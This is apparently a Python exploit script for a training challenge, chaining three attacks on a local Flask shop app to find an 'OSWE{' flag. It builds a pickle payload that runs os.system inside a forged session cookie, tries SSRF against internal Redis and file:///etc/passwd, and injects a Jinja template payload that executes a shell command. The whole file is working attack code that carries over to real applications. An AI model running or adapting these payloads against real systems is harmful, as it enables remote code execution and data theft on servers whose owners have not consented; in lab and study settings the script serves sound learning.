#!/usr/bin/env python3
"""
Exploit script for Challenge 2: Python Flask E-Commerce
Chains Pickle Deserialization + SSRF + SSTI
"""

import requests
import pickle
import base64
import sys

BASE_URL = "http://localhost:5000"

def create_pickle_payload():
    """Create pickle payload for RCE"""
    import os
    
    class RCE:
        def __reduce__(self):
            # Simple command execution
            cmd = 'id'
            return os.system, (cmd,)
    
    # Create session data with RCE payload
    session_data = {
        'user_id': 1,
        'username': 'admin',
        'role': 'admin',
        'rce': RCE()
    }
    
    pickled = pickle.dumps(session_data)
    cookie_value = base64.b64encode(pickled).decode()
    
    return cookie_value

def exploit_pickle_deserialization():
    """Exploit pickle deserialization via session cookie"""
    print("[*] Creating pickle payload...")
    
    cookie_value = create_pickle_payload()
    
    print(f"[*] Cookie value: {cookie_value[:50]}...")
    
    # Create session with malicious cookie
    session = requests.Session()
    session.cookies.set('session', cookie_value)
    
    # Try to access admin panel (this will trigger deserialization)
    print("[*] Attempting to access admin panel...")
    try:
        response = session.get(f"{BASE_URL}/admin", timeout=2)
        print(f"[+] Response status: {response.status_code}")
        if 'OSWE{' in response.text:
            import re
            flag_match = re.search(r'OSWE\{[^}]+\}', response.text)
            if flag_match:
                print(f"[+] FLAG FOUND: {flag_match.group(0)}")
                return True
    except Exception as e:
        print(f"[!] Error (may be expected if RCE executed): {e}")
    
    return False

def exploit_ssrf():
    """Exploit SSRF to access internal services"""
    print("[*] Attempting SSRF...")
    
    session = requests.Session()
    
    # Login first
    login_data = {'username': 'user', 'password': 'user123'}
    session.post(f"{BASE_URL}/login", data=login_data)
    
    # Try SSRF
    ssrf_urls = [
        'http://localhost:6379/',
        'http://redis:6379/',
        'file:///etc/passwd',
        'http://127.0.0.1:6379/',
    ]
    
    for url in ssrf_urls:
        print(f"[*] Trying SSRF with URL: {url}")
        try:
            response = session.post(f"{BASE_URL}/fetch", data={'url': url}, timeout=3)
            print(f"[+] Response: {response.text[:200]}")
        except Exception as e:
            print(f"[-] Error: {e}")

def exploit_ssti():
    """Exploit SSTI in product description"""
    print("[*] Attempting SSTI...")
    
    session = requests.Session()
    
    # First, need admin access
    # Try with pickle deserialization
    cookie_value = create_pickle_payload()
    session.cookies.set('session', cookie_value)
    
    # Add product with SSTI payload
    ssti_payload = "{{ config.__class__.__init__.__globals__['os'].system('id') }}"
    
    try:
        response = session.post(
            f"{BASE_URL}/admin/products/add",
            data={
                'name': 'Test Product',
                'description': ssti_payload,
                'price': '10.00'
            },
            timeout=2
        )
        print(f"[+] Product added (may have executed command)")
    except Exception as e:
        print(f"[!] Error: {e}")

def main():
    print("=" * 60)
    print("Challenge 2: Python Flask E-Commerce Exploit")
    print("=" * 60)
    
    # Method 1: Pickle Deserialization
    print("\n[*] Method 1: Pickle Deserialization")
    if exploit_pickle_deserialization():
        return
    
    # Method 2: SSRF
    print("\n[*] Method 2: SSRF")
    exploit_ssrf()
    
    # Method 3: SSTI
    print("\n[*] Method 3: SSTI")
    exploit_ssti()
    
    print("\n[!] Note: Pickle deserialization may require manual cookie setting")
    print("[!] Use browser extension or Burp Suite to set session cookie")

if __name__ == "__main__":
    main()

